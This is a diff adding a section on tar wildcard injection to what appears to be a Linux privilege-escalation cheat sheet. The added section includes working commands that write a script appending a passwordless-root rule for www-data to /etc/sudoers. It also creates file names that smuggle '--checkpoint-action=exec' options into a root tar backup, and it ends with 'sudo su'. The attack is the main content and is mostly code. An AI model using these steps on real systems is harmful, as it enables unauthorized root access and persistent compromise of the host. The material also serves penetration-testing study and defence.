@@ -359,6 +359,30 @@ sudo env /bin/sh
 
 
 
+## Tar (Wildcard Injection)
+
+Basically, tar allows the usage of 2 options that can be used for poisoning, in order to force the binary to execute unintended actions:
+
+* checkpoint\[=NUMBER] — this option displays progress messages every NUMBERth record (default value is 10)
+* checkpoint-action=ACTION — this option executes said ACTION on each checkpoint
+
+```
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
+
+touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
+
+touch "/var/www/html/--checkpoint=1"
+
+# If there is an backup file running as root and using tar commands to 
+compress a folder then you use the above 3 commands inside that folder.
+
+# After that you just need to do sudo su to become root. The time to execute the
+backup file may depends. Look at the /etc/crontab file
+
+sudo su
+
+```
+
 
 
 ***
@@ -370,3 +394,5 @@ sudo env /bin/sh
 * [https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/](https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/)
 * [https://gtfobins.github.io/gtfobins/env/#sudo](https://gtfobins.github.io/gtfobins/env/#sudo)
 * [https://gtfobins.github.io/gtfobins/find/#suid](https://gtfobins.github.io/gtfobins/find/#suid)
+* [https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
+* [https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
